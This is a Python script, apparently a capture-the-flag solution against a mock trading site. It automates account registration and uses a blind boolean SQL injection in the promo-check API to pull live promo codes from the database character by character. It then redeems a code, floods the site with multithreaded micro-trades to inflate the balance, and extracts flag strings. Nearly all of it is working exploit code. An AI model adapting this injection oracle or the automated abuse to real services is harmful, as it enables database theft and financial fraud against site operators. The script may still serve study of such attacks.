#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Momentum2 — спокойный фарм. Медленно, ровно, до цели.

    python3 farm.py            # 8 потоков, без спешки
    python3 farm.py 16         # 16 потоков
    python3 farm.py 8 0.02     # 8 потоков + пауза 20 мс между сделками

Что делает: входит в сохранённый аккаунт (или создаёт новый), при нехватке денег
один раз активирует промокод, дальше ставит 1 руб. с множителем 1.01 (+1 руб. за
сделку) и идёт к 250 000. Каждые 5 секунд печатает: сколько сделано, сколько
сделок в секунду и сколько осталось ждать. На цели сам покупает элиту.

Вывод без символа рубля: на Windows-консоли он ломает печать.
"""

import os
import re
import sys
import json
import time
import random
import string
import ssl
import gzip
import zlib
import threading
import http.client
import urllib.parse

VERSION = "farm-1"
BASE = os.environ.get(
    "M2_BASE",
    "https://4fc999215e4d4971.xn--80aqf1ad.xn--r1aee.xn--80afol2bmm.xn--p1acf",
).rstrip("/")
U = urllib.parse.urlsplit(BASE)
HOST, PORT, TLS = U.hostname, U.port or 443, U.scheme == "https"
GOAL = 250000
PASS = "Pa55word!x"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124 Safari/537.36"
ACC = os.path.join(os.path.dirname(os.path.abspath(__file__)), "account.json")

COOKIE = ""
LOCK = threading.Lock()

try:
    sys.stdout.reconfigure(errors="replace")
except Exception:
    pass


def say(*a):
    print(*a)
    sys.stdout.flush()


def uesc(s):
    return re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), s)


def plain(s):
    s = uesc(s)
    s = re.sub(r"<script.*?</script>", " ", s, flags=re.S | re.I)
    return re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", s)).strip()


def conn(timeout=30):
    if TLS:
        return http.client.HTTPSConnection(HOST, PORT, timeout=timeout,
                                           context=ssl.create_default_context())
    return http.client.HTTPConnection(HOST, PORT, timeout=timeout)


def raw(method, path, body=None, cookie=None, timeout=30):
    c = conn(timeout)
    h = {"Host": HOST, "User-Agent": UA, "Accept": "*/*", "Connection": "close"}
    if cookie:
        h["Cookie"] = cookie
    if body is not None:
        h["Content-Type"] = "application/x-www-form-urlencoded"
    try:
        c.request(method, path, body=body, headers=h)
        r = c.getresponse()
        return r.status, r.read().decode("utf-8", "replace"), r.getheaders()
    except Exception as e:
        return 0, "%s: %s" % (type(e).__name__, e), []
    finally:
        try:
            c.close()
        except Exception:
            pass


def req(method, path, data=None):
    global COOKIE
    body = urllib.parse.urlencode(data) if data is not None else None
    st, txt, hdr = raw(method, path, body, COOKIE)
    jar = {}
    for p in COOKIE.split(";"):
        p = p.strip()
        if "=" in p:
            k, v = p.split("=", 1)
            jar[k] = v
    for k, v in hdr:
        if k.lower() == "set-cookie":
            first = v.split(";", 1)[0]
            if "=" in first:
                n, val = first.split("=", 1)
                jar[n.strip()] = val.strip()
    COOKIE = "; ".join("%s=%s" % (k, v) for k, v in jar.items())
    return st, txt


def balance():
    _, p = req("GET", "/profile")
    m = re.search(r"([\d][\d\s\u00a0]{0,14})\s*(?:\u20bd|руб)", plain(p))
    return int(re.sub(r"\D", "", m.group(1)) or 0) if m else 0


def save_acc(user):
    try:
        with open(ACC, "w", encoding="utf-8") as f:
            json.dump({"user": user, "pass": PASS, "cookie": COOKIE}, f)
    except Exception:
        pass


def saved_acc():
    try:
        with open(ACC, encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}


def login(user, pw=None):
    global COOKIE
    pw = pw or saved_acc().get("pass") or PASS
    COOKIE = ""
    req("GET", "/logout")
    st, _ = req("POST", "/login", {"username": user, "password": pw})
    _, p = req("GET", "/profile")
    ok = user in uesc(p)
    if ok:
        save_acc(user)
    return ok


def register():
    global COOKIE
    COOKIE = ""
    req("GET", "/logout")
    user = "f" + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
    req("POST", "/register", {"username": user, "password": PASS})
    if not login(user):
        say("  !! не удалось зарегистрироваться")
    return user


def ensure_account():
    s = saved_acc().get("user")
    if s and login(s):
        return s
    return register()


# --- промо: один аккуратный запрос, без гонок ---

def oracle(sql, tries=3):
    path = "/api/v1/promo/check?code=" + urllib.parse.quote("' OR (" + sql + ")--")
    for _ in range(tries):
        st, t = req("GET", path)
        if st == 200:
            try:
                return bool(json.loads(t).get("available"))
            except Exception:
                m = re.search(r'"available"\s*:\s*(true|false)', t)
                if m:
                    return m.group(1) == "true"
        time.sleep(0.2)
    return None


CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_@|:-./"


def _len(e, hi=6000):
    q = "length(ifnull((%s),''))" % e
    lo = 0
    while lo < hi:
        mid = (lo + hi + 1) // 2
        v = oracle("%s>=%d" % (q, mid))
        if v is None:
            return None
        lo, hi = (mid, hi) if v else (lo, mid - 1)
    return lo


def _chr(e, i):
    idx = "instr('%s',substr(ifnull((%s),''),%d,1))" % (CHARS, e, i)
    if not oracle("%s>=1" % idx):
        lo, hi = 0, 0x2FFFF
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if oracle("unicode(substr(ifnull((%s),''),%d,1))>=%d" % (e, i, mid)):
                lo = mid
            else:
                hi = mid - 1
        return chr(lo)
    lo, hi = 1, len(CHARS)
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if oracle("%s>=%d" % (idx, mid)):
            lo = mid
        else:
            hi = mid - 1
    return CHARS[lo - 1]


def _str(e):
    n = _len(e)
    return "" if not n else "".join(_chr(e, i) for i in range(1, n + 1))


def live_codes():
    d = _str("SELECT group_concat(code,'|') FROM promos WHERE uses_left>0")
    return [c for c in (d or "").split("|") if c]


def prep_money():
    b = balance()
    if b >= 10000:
        say("  на счету %d rub — промо не трогаю (redeem ПРИСВАИВАЕТ 10000)" % b)
        return b
    codes = live_codes()
    say("  живые промокоды: %s" % (codes or "нет"))
    for c in codes:
        st, t = req("POST", "/promo/redeem", {"code": c})
        if '"credited"' in uesc(t):
            b = balance()
            say("  промокод %s принят, баланс %d rub" % (c, b))
            break
    return balance()


# --- торговля ---

def worker(stop, st, pause):
    c = conn(30)
    body = urllib.parse.urlencode({"asset": "RUB/USD", "direction": "up",
                                   "amount": "1", "multiplier": "1.01"})
    hdr = {"Host": HOST, "Content-Type": "application/x-www-form-urlencoded",
           "Cookie": COOKIE, "User-Agent": UA, "Accept": "*/*",
           "Accept-Encoding": "gzip, deflate"}
    while not stop.is_set():
        try:
            if c.sock is None:
                c.connect()
            c.request("POST", "/trade", body=body, headers=hdr)
            r = c.getresponse()
            rawb = r.read()
            enc = (r.getheader("Content-Encoding") or "").lower()
            if enc == "gzip":
                try:
                    rawb = gzip.decompress(rawb)
                except Exception:
                    pass
            elif enc == "deflate":
                try:
                    rawb = zlib.decompress(rawb, -zlib.MAX_WBITS)
                except Exception:
                    pass
            d = rawb.decode("utf-8", "replace")
            try:
                j = json.loads(uesc(d))
            except Exception:
                j = {}
            if "won" not in j:
                e = str(j.get("error") or plain(d)[:60])
                with LOCK:
                    st["err"][e] = st["err"].get(e, 0) + 1
                if any(w in e.lower() for w in ("средств", "войд", "сумм")):
                    stop.set()
                time.sleep(0.5)
                continue
            with LOCK:
                st["trades"] += 1
                if j.get("won"):
                    st["wins"] += 1
                bl = j.get("balance")
                if isinstance(bl, int):
                    bl //= 100
                    if bl > st["best"]:
                        st["best"] = bl
                    if bl >= GOAL:
                        stop.set()
            if pause:
                time.sleep(pause)
        except Exception:
            try:
                c.close()
            except Exception:
                pass
            c = conn(30)
            time.sleep(0.2)


def fmt(sec):
    if sec is None or sec < 0 or sec > 86400 * 3:
        return "?"
    sec = int(sec)
    h, m, s = sec // 3600, (sec % 3600) // 60, sec % 60
    return ("%d ч %02d мин" % (h, m)) if h else ("%d мин %02d с" % (m, s))


def farm(threads=8, pause=0.0):
    st = {"trades": 0, "wins": 0, "best": 0, "err": {}}
    stop = threading.Event()
    b0 = balance()
    st["best"] = b0
    say("")
    say("-" * 64)
    say(" старт: %d rub | цель: %d rub | потоков: %d | пауза: %.3f с"
        % (b0, GOAL, threads, pause))
    say("-" * 64)
    ts = [threading.Thread(target=worker, args=(stop, st, pause), daemon=True)
          for _ in range(threads)]
    t0 = time.time()
    for t in ts:
        t.start()

    while not stop.is_set():
        time.sleep(5)
        el = time.time() - t0
        b = balance()
        rate = st["trades"] / el if el else 0.0
        left = max(0, GOAL - b)
        eta = (left / rate) if rate > 0.05 else None
        say("  %s | сделок %d | %.1f в сек | %d rub | осталось %d | ждать ~%s"
            % (time.strftime("%H:%M:%S"), st["trades"], rate, b, left, fmt(eta)))
        if st["err"]:
            top = sorted(st["err"].items(), key=lambda x: -x[1])[:2]
            say("      ошибки: %s" % top)
        if b >= GOAL:
            stop.set()

    stop.set()
    for t in ts:
        t.join(5)
    return balance()


def buy():
    st, t = req("POST", "/profile/buy")
    say("")
    say("покупка -> %s" % st)
    flags = re.findall(r"flag\{[^}]+\}", uesc(t))
    say("ФЛАГИ: %s" % flags)
    m = re.search(r"(элит\w*[^.]{0,240}|код участника[^.]{0,240})", plain(t), re.I)
    say("текст: %s" % (m.group(1) if m else plain(t)[:240]))


def main():
    args = sys.argv[1:]
    threads = next((int(a) for a in args if a.isdigit()), 8)
    pause = 0.0
    for a in args:
        # пауза задаётся только дробным числом (0.05), чтобы не путать с числом потоков
        if "." not in a:
            continue
        try:
            f = float(a)
            if 0 < f < 5:
                pause = f
        except ValueError:
            pass

    say("farm.py %s | %s" % (VERSION, BASE))
    user = ensure_account()
    b = balance()
    say("  аккаунт: %s | баланс: %d rub" % (user, b))
    b = prep_money()
    if b < 10:
        say("  !! денег нет даже на одну сделку. Нужен аккаунт с промокодом.")
        return

    b = farm(threads, pause)
    if b >= GOAL:
        buy()
    else:
        say("")
        say("остановлено на %d rub (не хватило %d). Запусти ещё раз — продолжит." % (b, max(0, GOAL - b)))


if __name__ == "__main__":
    main()
